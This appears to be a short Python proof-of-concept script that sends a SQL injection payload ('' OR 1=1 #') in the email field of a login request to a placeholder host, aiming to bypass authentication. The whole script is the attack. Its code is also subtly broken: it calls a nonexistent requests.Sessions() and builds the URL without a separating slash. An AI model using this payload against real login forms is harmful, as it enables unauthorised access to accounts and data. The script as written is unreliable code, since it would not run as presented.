#!/usr/bin/env python3

import requests

url = "http://example.com"

s = requests.Sessions()

r = s.post(
    url + "login",
    data ={
        "email": "' OR 1=1 #",
        "password": "password",
    },
)

print(r.text)